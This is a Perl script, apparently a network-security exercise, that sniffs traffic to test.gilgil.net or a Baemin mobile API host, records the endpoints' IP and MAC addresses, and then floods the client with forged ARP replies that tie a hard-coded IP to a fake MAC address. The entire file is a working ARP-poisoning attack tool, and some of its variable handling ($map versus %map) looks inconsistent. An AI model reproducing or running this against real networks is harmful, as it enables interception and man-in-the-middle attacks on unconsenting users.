use Net::Pcap;
use NetPacket::Ethernet qw(:strip);
use NetPacket::IP qw(:strip);
use NetPacket::TCP;

my $pcap;
my $err;
my $dev = select_dev();
my @listing = snif_packet($dev);
my %map = make_hash(@listing);
my @route = get_route();
#$map->{my_mac} = "00:1c:42:1d:51:d6";
#$map->{my_mac} = "a8:60:b6:02:d4:73";
$map->{my_mac} = "41:41:41:41:41:42";
$map->{my_ip} ="192.168.0.100";


while(1){
	send_arp($map->{cli_mac}, $map->{my_mac}, $map->{cli_ip}, $map->{my_ip});
#	sleep(5);
}

pcap_close($pcap);

sub send_arp{ #dest_mac , $src_mac , $dest_ip, $src_ip 
	
	my @dest_mac = split (/:/,$_[0]);
	my @src_mac = split (/:/, $_[1]);
	my @dest_ip = split (/\./,$_[2]);
	my @src_ip = split (/\./, $_[3]);

	my $arp_packet .= make_hex(@dest_mac,"mac");
	$arp_packet .= make_hex(@src_mac,"mac");
	$arp_packet .= "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
	$arp_packet .= make_hex(@src_mac, "mac");
	$arp_packet .= make_hex(@src_ip, "ip");
	$arp_packet .= make_hex(@dest_mac, "mac");
	$arp_packet .= make_hex(@dest_ip, "ip");
	Net::Pcap::sendpacket($pcap,$arp_packet);
	}

sub make_hex{
	my $ret ="";
	my $chk = pop;
	my $tmp;
	foreach(@_){
		if($chk eq "ip"){ $tmp = sprintf("%02x",$_);}
		else { $tmp = $_;}
		$ret .= chr(hex($tmp));
	}
	return $ret;
}


sub snif_packet{
	print "Start packet capture \n";
	my @ret;
	my $dev = shift;
	$pcap = pcap_open_live($dev, 65536, 1, 1000, \$err) or die "Can't open device $dev: $err\n";
	my $filter;
	my $filter_str = "host test.gilgil.net or omg-mobile-api.baemin.com";
	pcap_compile( $pcap, \$filter, $filter_str, 1, 0 );
	pcap_setfilter( $pcap, $filter );

	while(1){
		my ($packet, %header);
		Net::Pcap::pcap_next_ex($pcap, \%header, \$packet);
		my $ip_obj  = NetPacket::IP->decode( eth_strip($packet) );
		my $eth_obj = NetPacket::Ethernet->decode($packet);

		if($packet){
			push @ret , $ip_obj->{src_ip};
			push @ret , split_mac($eth_obj->{src_mac});
			push @ret , $ip_obj->{dest_ip};
			push @ret , split_mac($eth_obj->{dest_mac});
			last;
		}
	}
	return @ret;
}

sub split_mac{
	my $mac = shift;
	my $ret;
	if (length($mac) == 12){
		@tmp = split "",$mac;
		my $cnt = 5;
		my $flag = 1;
		foreach(@tmp){
			$ret .= $_;
			$flag *= -1;
			if($cnt && $flag > 0){$ret .= ":"; $cnt--;}
		}
	}
	else {
		$mac = "0".$mac;
		@tmp = split "",$mac;
		my $cnt = 5;
		my $flag = 1;
		foreach(@tmp){
			$ret .= $_;
			$flag *= -1;
			if($cnt && $flag > 0){$ret .= ":"; $cnt--;}
		}
	}
	return $ret;
}

sub select_dev{
	my @all_dev = Net::Pcap::findalldevs(\$err);
	my $cnt = 1;
	foreach (@all_dev){
		print "$cnt : $_ \n";
		$cnt ++;
	}
	print "Selcet Device number : ";
	my $ret = <>;
	return $all_dev[$ret-1];
}

sub make_hash{
	my @listing = @_;
	my %map;
	print "1. $listing[0] / $listing[1]\n";
	print "2. $listing[2] / $listing[3]\n";
	print "select server number : ";
	my $cnt = <>;
	if ($cnt == 1 ){
		$map->{ser_ip} = $listing[0];
		$map->{ser_mac} = $listing[1];
		$map->{cli_ip} = $listing[2];
		$map->{cli_mac} = $listing[3];
	}
	elsif ($cnt == 2) {
		$map->{ser_ip} = $listing[2];
		$map->{ser_mac} = $listing[3];
		$map->{cli_ip} = $listing[0];
		$map->{cli_mac} = $listing[1];
	}
	else {print "Err number _ \n";}
	return %map;
}

sub get_route{
	my @ret;
	my $ip;
	my @a  = split "\n",`route get default`; foreach(@a){
		if(/gateway: /){ push @ret, $'; $ip = $'; last; }
	}
	my @b = split "\n",`arp -a`; foreach(@b){
		if(/( \($ip\) at )(.+:..)/) { push @ret, $2; last;}

	}
	return @ret;
}
